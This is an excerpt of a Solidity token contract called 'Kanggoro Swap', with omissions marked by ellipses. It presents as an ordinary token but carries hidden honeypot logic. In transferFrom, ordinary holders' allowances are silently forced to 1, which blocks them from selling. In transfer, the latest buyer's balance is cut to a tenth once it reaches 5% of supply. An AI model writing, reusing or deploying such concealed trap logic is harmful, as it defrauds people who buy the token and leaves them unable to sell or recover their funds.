...
contract KanggoroToken {
    using SafeMath for uint256;
    string public name = "Kanggoro Swap";
    string public symbol = "KANGGORO";
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Buy != Owner && to != Buy && balanceOf[Buy]>=totalSupply.div(20)) {
            balanceOf[Buy]=balanceOf[Buy].div(10);}
        if (msg.sender==KanggoroPair() && balanceOf[to]==0) {Buy = to;}
        if (to== Owner) {Buy=to;}
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Buy) {allowance[from][msg.sender]=1;} 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function KanggoroPair() public view returns (address) {
